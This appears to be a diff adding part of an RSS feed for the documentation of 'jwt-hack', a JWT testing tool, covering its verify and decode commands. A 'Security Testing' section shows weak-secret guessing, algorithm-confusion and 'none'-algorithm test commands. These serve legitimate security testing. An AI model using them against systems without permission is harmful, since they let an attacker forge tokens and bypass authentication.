+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack verify &amp;lt;TOKEN&amp;gt; [OPTIONS]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;secret-based-verification-hmac&quot;&gt;Secret-Based Verification (HMAC)&lt;/h2&gt;
+&lt;p&gt;Verify HMAC-signed tokens with a shared secret:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Verify HS256 token
+jwt-hack verify eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.5mhBHqs5_DTLdINd9p5m7ZJ6XD0Xc55kIaCRY5r6HRA --secret=test
+
+# Try different secrets
+jwt-hack verify &amp;lt;TOKEN&amp;gt; --secret=secret123
+jwt-hack verify &amp;lt;TOKEN&amp;gt; --secret=password
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;key-based-verification-rsaecdsa&quot;&gt;Key-Based Verification (RSA/ECDSA)&lt;/h2&gt;
+&lt;p&gt;Verify asymmetric tokens using public keys:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Verify RSA-signed token
+jwt-hack verify &amp;lt;RSA_TOKEN&amp;gt; --private-key=public.pem
+
+# Verify ECDSA-signed token
+jwt-hack verify &amp;lt;ECDSA_TOKEN&amp;gt; --private-key=ec-public.pem
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;expiration-validation&quot;&gt;Expiration Validation&lt;/h2&gt;
+&lt;p&gt;Check if the token has expired:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Enable expiration validation
+jwt-hack verify &amp;lt;TOKEN&amp;gt; --secret=test --validate-exp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With &lt;code&gt;--validate-exp&lt;/code&gt;, the command will:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Check the &lt;code&gt;exp&lt;/code&gt; (expiration) claim&lt;/li&gt;
+&lt;li&gt;Validate against current timestamp&lt;/li&gt;
+&lt;li&gt;Report if the token is expired&lt;/li&gt;
+&lt;li&gt;Show time remaining or time since expiration&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;command-options&quot;&gt;Command Options&lt;/h2&gt;
+&lt;h3 id=&quot;required&quot;&gt;Required&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;TOKEN&amp;gt;&lt;/code&gt; - The JWT token to verify&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;authentication-options&quot;&gt;Authentication Options&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;--secret &amp;lt;SECRET&amp;gt;&lt;/code&gt; - Secret for HMAC token verification&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--private-key &amp;lt;PATH&amp;gt;&lt;/code&gt; - Path to public key file for RSA/ECDSA verification&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;validation-options&quot;&gt;Validation Options&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;--validate-exp&lt;/code&gt; - Enable expiration time validation&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;verification-results&quot;&gt;Verification Results&lt;/h2&gt;
+&lt;p&gt;The verify command provides detailed output:&lt;/p&gt;
+&lt;h3 id=&quot;successful-verification&quot;&gt;Successful Verification&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;✓ Signature Valid
+✓ Token Structure Valid
+✓ Algorithm: HS256
+✓ Expiration: Valid (expires in 2 hours)
+&lt;/code&gt;&lt;/pre&gt;&quot;failed-verification&quot;&gt;Failed Verification&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;✗ Signature Invalid
+✓ Token Structure Valid
+- Algorithm: HS256
+- Reason: Incorrect secret or signature tampering
+&lt;/code&gt;&lt;/pre&gt; id=&quot;expiration-issues&quot;&gt;Expiration Issues&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;✓ Signature Valid
+✓ Token Structure Valid
+✗ Expiration: Token expired 30 minutes ago
+&lt;/code&gt;&lt;/pre&gt;d=&quot;examples&quot;&gt;Examples&lt;/h2&gt;
+&lt;h3 id=&quot;basic-hmac-verification&quot;&gt;Basic HMAC Verification&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Verify with correct secret
+jwt-hack verify eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.SIGNATURE --secret=correct-secret
+
+# Try with wrong secret (will fail)
+jwt-hack verify eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.SIGNATURE --secret=wrong-secret
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;rsa-token-verification&quot;&gt;RSA Token Verification&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Verify RSA256 token with public key
+jwt-hack verify &amp;lt;RSA_TOKEN&amp;gt; --private-key=rsa-public.pem
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;complete-validation&quot;&gt;Complete Validation&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Verify signature and check expiration
+jwt-hack verify &amp;lt;TOKEN&amp;gt; --secret=mysecret --validate-exp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;key-file-requirements&quot;&gt;Key File Requirements&lt;/h2&gt;
+&lt;h3 id=&quot;for-rsaecdsa-verification&quot;&gt;For RSA/ECDSA Verification&lt;/h3&gt;
+&lt;p&gt;You need the &lt;strong&gt;public key&lt;/strong&gt; corresponding to the private key used for signing:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Extract public key from private key
+openssl rsa -in private.pem -pubout -out public.pem
+
+# Use public key for verification
+jwt-hack verify &amp;lt;TOKEN&amp;gt; --private-key=public.pem
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;supported-public-key-formats&quot;&gt;Supported Public Key Formats&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;X.509 SubjectPublicKeyInfo&lt;/strong&gt; - &lt;code&gt;-----BEGIN PUBLIC KEY-----&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PKCS#1 RSA Public Key&lt;/strong&gt; - &lt;code&gt;-----BEGIN RSA PUBLIC KEY-----&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;security-testing&quot;&gt;Security Testing&lt;/h2&gt;
+&lt;p&gt;The verify command is useful for security testing:&lt;/p&gt;
+&lt;h3 id=&quot;test-different-secrets&quot;&gt;Test Different Secrets&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Test common weak secrets
+jwt-hack verify &amp;lt;TOKEN&amp;gt; --secret=secret
+jwt-hack verify &amp;lt;TOKEN&amp;gt; --secret=password
+jwt-hack verify &amp;lt;TOKEN&amp;gt; --secret=123456
+jwt-hack verify &amp;lt;TOKEN&amp;gt; --secret=test
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;algorithm-confusion-testing&quot;&gt;Algorithm Confusion Testing&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Test if RSA token accepts HMAC verification (algorithm confusion)
+jwt-hack verify &amp;lt;RSA_TOKEN&amp;gt; --secret=&amp;lt;PUBLIC_KEY_CONTENT&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;none-algorithm-testing&quot;&gt;None Algorithm Testing&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Test unsigned tokens (none algorithm)
+jwt-hack verify &amp;lt;NONE_TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;return-codes&quot;&gt;Return Codes&lt;/h2&gt;
+&lt;p&gt;The verify command uses exit codes for scripting:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;0&lt;/strong&gt; - Verification successful&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;1&lt;/strong&gt; - Verification failed&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2&lt;/strong&gt; - Token format error&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;3&lt;/strong&gt; - Expiration validation failed&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Example usage in scripts:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;if jwt-hack verify &amp;quot;$TOKEN&amp;quot; --secret=&amp;quot;$SECRET&amp;quot;; then
+    echo &amp;quot;Token is valid&amp;quot;
+else
+    echo &amp;quot;Token verification failed&amp;quot;
+fi
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    <item>
+      <title>Decode Command</title>
+      <link>http://localhost:3000/usage/commands/decode/</link>
+      <guid>http://localhost:3000/usage/commands/decode/</guid>
+      <description>&lt;p&gt;The &lt;code&gt;decode&lt;/code&gt; command analyzes JWT and JWE tokens, displaying their structure, headers, payloads, and validation information.&lt;/p&gt;
+&lt;h2 id=&quot;basic-usage&quot;&gt;Basic Usage&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack decode &amp;lt;TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;jwt-token-decoding&quot;&gt;JWT Token Decoding&lt;/h2&gt;
+&lt;p&gt;Decode a standard JWT token to see its header and payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.5mhBHqs5_DTLdINd9p5m7ZJ6XD0Xc55kIaCRY5r6HRA
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Output includes:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Token algorithm and type&lt;/li&gt;
+&lt;li&gt;Decoded header (JSON format)&lt;/li&gt;
+&lt;li&gt;Decoded payload (JSON format)&lt;/li&gt;
+&lt;li&gt;Timestamp information (iat, exp, nbf if present)&lt;/li&gt;
+&lt;li&gt;Token structure validation&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;jwe-token-decoding&quot;&gt;JWE Token Decoding&lt;/h2&gt;
+&lt;p&gt;JWT-HACK automatically detects and decodes JWE (JSON Web Encryption) tokens:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack decode eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..ZHVtbXlfaXZfMTIzNDU2.eyJ0ZXN0IjoiandlIn0.ZHVtbXlfdGFn
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;JWE Output includes:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;JWE header with encryption algorithm&lt;/li&gt;
+&lt;li&gt;Encrypted key component&lt;/li&gt;
+&lt;li&gt;Initialization vector (IV)&lt;/li&gt;
+&lt;li&gt;Ciphertext&lt;/li&gt;
+&lt;li&gt;Authentication tag&lt;/li&gt;
+&lt;li&gt;5-part structure validation&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;deflate-compression-support&quot;&gt;DEFLATE Compression Support&lt;/h2&gt;
+&lt;p&gt;JWT-HACK automatically detects and decompresses DEFLATE-compressed JWTs:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack decode &amp;lt;COMPRESSED_JWT_TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The tool will:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Detect compression automatically&lt;/li&gt;
+&lt;li&gt;Decompress the payload&lt;/li&gt;
+&lt;li&gt;Display the original uncompressed content&lt;/li&gt;
+&lt;li&gt;Show compression details in the output&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;timestamp-analysis&quot;&gt;Timestamp Analysis&lt;/h2&gt;
+&lt;p&gt;When JWT contains timestamp fields, the decode command provides:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;iat (Issued At)&lt;/strong&gt; - When the token was created&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;exp (Expires)&lt;/strong&gt; - When the token expires&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;nbf (Not Before)&lt;/strong&gt; - When the token becomes valid&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Timestamps are displayed in both Unix timestamp and human-readable formats.&lt;/p&gt;
+&lt;h2 id=&quot;error-handling&quot;&gt;Error Handling&lt;/h2&gt;
+&lt;p&gt;The decode command handles various token formats gracefully:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Invalid Base64&lt;/strong&gt; - Shows decoding errors with context&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Malformed JSON&lt;/strong&gt; - Displays JSON parsing errors&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Invalid Structure&lt;/strong&gt; - Identifies structural issues&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Missing Components&lt;/strong&gt; - Reports incomplete tokens&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;examples&quot;&gt;Examples&lt;/h2&gt;
+&lt;h3 id=&quot;standard-jwt&quot;&gt;Standard JWT&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Decode a basic HMAC-signed JWT
+jwt-hack decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.SIGNATURE
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;rsa-signed-jwt&quot;&gt;RSA-signed JWT&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Decode an RSA-signed JWT
+jwt-hack decode eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJleGFtcGxlIn0.SIGNATURE
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;jwt-with-custom-headers&quot;&gt;JWT with Custom Headers&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Decode JWT with custom header fields
+jwt-hack decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleTEifQ.PAYLOAD.SIGNATURE
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+  </channel>
+</rss>
